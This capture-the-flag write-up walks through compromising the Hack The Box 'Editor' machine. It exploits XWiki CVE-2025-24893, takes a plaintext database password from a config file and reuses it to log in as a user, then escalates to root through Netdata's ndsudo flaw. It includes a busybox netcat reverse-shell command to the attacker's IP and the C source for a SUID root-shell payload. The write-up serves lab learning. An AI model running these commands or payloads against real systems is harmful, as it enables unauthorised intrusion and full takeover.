# Hack The Box – Editor

**Platform:** Hack The Box
**Category:** Web → CMS Exploitation → RCE → Credential Disclosure → Local Privilege Escalation
**Host:** Kali Linux

---

## Overview

Editor is a web-focused machine built around XWiki, a popular enterprise wiki platform.
The compromise path abuses a pre-authenticated remote code execution vulnerability in XWiki, followed by credential disclosure from configuration files and a local privilege escalation via a vulnerable SUID binary.

This machine is a realistic example of how unpatched third-party software and careless credential handling can lead to full system compromise.

---

## Reconnaissance

Initial scanning revealed multiple exposed services:

```bash
nmap editor.htb -A
```


Open ports:

22/tcp – OpenSSH

80/tcp – nginx (landing site)

8080/tcp – Jetty (XWiki)

Port 8080 immediately stood out as it exposed an XWiki instance.

---

## XWiki Enumeration

Accessing http://editor.htb:8080 revealed the XWiki web interface.
The footer disclosed the exact XWiki version, which is a critical information leak.

Additional enumeration showed:

WebDAV enabled

Multiple risky HTTP methods allowed

Extensive /robots.txt disallow entries exposing internal endpoints

This confirmed a large and complex attack surface.

---

## Pre-Auth RCE in XWiki (CVE-2025-24893)

Research revealed CVE-2025-24893, a remote code execution vulnerability affecting XWiki versions prior to:

15.10.11

16.4.1

16.5.0RC1

The vulnerability allows unauthenticated command execution.

A public PoC was used to trigger a reverse shell.

Listener setup:

```bash
nc -lnvp 4444
```


![](/writeups/notes/HackTheBox–Editor/img/01.png)


Exploit execution:

```bash
python CVE-2025-24893.py \
-t http://editor.htb:8080/ \
-c 'busybox nc 10.10.16.31 4444 -e /bin/bash'
```



A shell was obtained as the xwiki user.

---

## Post-Exploitation & Configuration Review

With code execution achieved, attention shifted to configuration files.

The file:

```bash
/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml
```



contained database credentials in plaintext:

```bash
<property name="hibernate.connection.password">theEd1t0rTeam99</property>
```



This is a severe security failure, as configuration files often contain high-value secrets.

---

## Lateral Movement (User Access)

The recovered password was reused to authenticate as a system user:

```bash
su oliver
```



This provided a stable shell and access to the user flag.

![](/writeups/notes/HackTheBox–Editor/img/02.png)

Credential reuse between services significantly amplified the impact of the initial compromise.

---

## Privilege Escalation Enumeration

Searching for files with special permissions revealed a suspicious binary:

```bash
/usr/bin/ndsudo
```



Research identified this as vulnerable to CVE-2024-32019, a local privilege escalation flaw in Netdata’s ndsudo helper.

---

## Local Privilege Escalation (CVE-2024-32019)

The vulnerability allows execution of arbitrary binaries with elevated privileges.

Because the target system lacked a compiler, a small SUID shell payload was compiled locally:

```bash
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```



Compiled locally and uploaded:

```bash
gcc poc.c -o nvme
scp nvme oliver@editor.htb:/tmp/
```



Executing the exploit resulted in a root shell.

Root Access

Verification:

```bash
id
uid=0(root) gid=0(root)
```


![](/writeups/notes/HackTheBox–Editor/img/03.png)


The root flag was successfully retrieved.
